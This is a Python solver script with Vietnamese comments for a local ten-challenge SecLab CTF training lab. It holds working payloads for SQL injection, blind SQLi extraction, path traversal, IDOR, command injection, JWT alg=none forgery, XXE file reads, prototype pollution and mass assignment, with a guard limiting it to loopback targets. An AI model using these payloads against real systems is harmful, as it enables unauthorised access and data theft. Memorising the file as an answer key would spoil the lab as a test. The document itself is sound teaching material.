#!/usr/bin/env python3
"""
solve_all.py — giải TRỌN 10 thử thách CTF của SecLab, chỉ dùng thư viện chuẩn.

Chạy:  python solutions/ctf/scripts/solve_all.py [base-url]
       mặc định base-url = http://127.0.0.1:3000  (lab VULN đang chạy)

Đọc comment trong từng hàm — mỗi hàm là một bài học khai thác.
"""
import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# Console Windows (cp1252) không in được tiếng Việt/mũi tên — ép UTF-8
# trước mọi print (kể cả thông báo guard).
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except AttributeError:
    pass

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:3000').rstrip('/')
TIMEOUT = 10

# Guard an toàn: chỉ chạy trên loopback trừ khi bạn xác nhận sở hữu mục tiêu.
_host = urllib.parse.urlparse(BASE).hostname or ''
if _host not in ('127.0.0.1', 'localhost', '::1') and '--i-own-this-target' not in sys.argv:
    print(f'⛔ Từ chối: mục tiêu "{_host}" không phải loopback.')
    print('   Lab CTF chỉ chạy trên máy của bạn. Nếu đây là server bạn sở hữu,')
    print('   thêm cờ --i-own-this-target (cùng quy ước guard.js của SecLab).')
    sys.exit(2)


def flag(prefix, text):
    m = re.search(rf'FLAG\{{{prefix}-[0-9a-f]+\}}', text or '')
    return m.group(0) if m else None


def get(path):
    """GET → (status, body-text). 404/302 không ném exception."""
    req = urllib.request.Request(BASE + path)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode('utf-8', 'replace'), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def post(path, body, ctype='application/x-www-form-urlencoded'):
    req = urllib.request.Request(BASE + path, data=body.encode(),
                                 headers={'Content-Type': ctype}, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode('utf-8', 'replace'), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def enc(s):
    return urllib.parse.quote(s, safe='')


# ── CTF #1 · SQLi ──
def solve01():
    _, t, _ = get("/search?q=" + enc("' OR 1=1 --"))
    return flag('sqli', t)


# ── CTF #2 · Traversal ──
def solve02():
    _, t, _ = get('/download?name=../flag-ctf.txt')
    return flag('trav', t)


# ── CTF #3 · IDOR ──
def solve03():
    _, t, _ = get('/api/users/4')
    return flag('idor', t)


# ── CTF #4 · /admin không kiểm quyền ──
def solve04():
    _, t, _ = get('/admin')
    return flag('admin', t)


# ── CTF #5 · Command Injection — thử cả 2 dấu nối (& cmd, ; sh) ──
def solve05():
    for payload in ('127.0.0.1 & set SECLAB', '127.0.0.1; env'):
        _, t, _ = get('/tools/ping?host=' + enc(payload))
        f = flag('cmd', t)
        if f:
            return f


# ── CTF #6 · JWT alg=none — forge không cần khoá ──
def solve06():
    b64u = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).rstrip(b'=').decode()
    forged = f"{b64u({'alg': 'none', 'typ': 'JWT'})}.{b64u({'sub': 'ctfsvc', 'role': 'svc'})}."
    _, t, _ = get('/api/profile?token=' + enc(forged))
    return flag('jwt', t)


# ── CTF #7 · XXE ──
def solve07():
    body = '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>'
    _, t, _ = post('/api/import', body, 'application/xml')
    return flag('xxe', t)


# ── CTF #8 · Prototype Pollution ──
def solve08():
    post('/api/config', '{"__proto__":{"isAdmin":true}}', 'application/json')
    _, t, _ = get('/api/config')
    return flag('proto', t)


# ── CTF #9 · Mass Assignment → login → /api/me ──
def solve09():
    import time
    user = f'solver{int(time.time()) & 0xFFFFFF:x}'
    post('/api/register?role=admin', f'username={user}&password=pw12345')
    _, _, hdrs = post('/login', f'username={user}&password=pw12345')
    cookie = next((v for k, v in hdrs.items() if k.lower() == 'set-cookie'), '')
    sid = re.search(r'session=([a-f0-9]+)', cookie)
    sid = sid.group(1) if sid else ''
    req = urllib.request.Request(BASE + '/api/me', headers={'Cookie': f'session={sid}'})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
        return flag('mass', r.read().decode())


# ── CTF #10 · Blind SQLi — oracle 200/404, rút từng ký tự ──
def solve10():
    charset = 'FLAG{}blind-0123456789abcdefxyz'
    out = ''
    for pos in range(1, 41):
        hit = ''
        for ch in charset:
            q = f"AB-100' AND (SELECT substr(flag,{pos},1) FROM ctf_blind)='{ch}' --"
            status, _, _ = get('/track?code=' + enc(q))
            if status == 200:
                hit = ch
                break
        if not hit:
            break
        out += hit
        if hit == '}':
            break
    return out or None


def verify(i, f):
    _, t, _ = get(f'/_lab/verify?id={i}&flag={enc(f)}')
    try:
        return json.loads(t)
    except json.JSONDecodeError:
        return {'ok': False}


SOLVERS = [solve01, solve02, solve03, solve04, solve05,
           solve06, solve07, solve08, solve09, solve10]
NAMES = ['SQLi', 'Traversal', 'IDOR', 'Admin', 'CmdInj',
         'JWT', 'XXE', 'ProtoPoll', 'MassAssign', 'BlindSQLi']

print(f'\n  SecLab CTF solver — target {BASE}\n')
score = total = solved = 0
for i, (name, fn) in enumerate(zip(NAMES, SOLVERS), 1):
    print(f'  [#{i:>2}] {name:<10}', end=' ', flush=True)
    try:
        f = fn()
    except Exception as e:  # noqa: BLE001 — hiển thị lỗi cho người học
        print(f'✘ lỗi: {e}')
        continue
    if not f:
        print('✘ không lấy được cờ (hardened? vuln chưa chạy?)')
        continue
    r = verify(i, f)
    if r.get('ok'):
        solved += 1
        score, total = r['score'], r['total']
        print(f'{f}  →  ✔ +điểm ({score}/{total})')
    else:
        print(f'{f}  →  ✘ server từ chối')
print(f'\n  KẾT QUẢ: {solved}/10 thử thách · điểm {score}/{total or 265}\n')
sys.exit(0 if solved == 10 else 1)
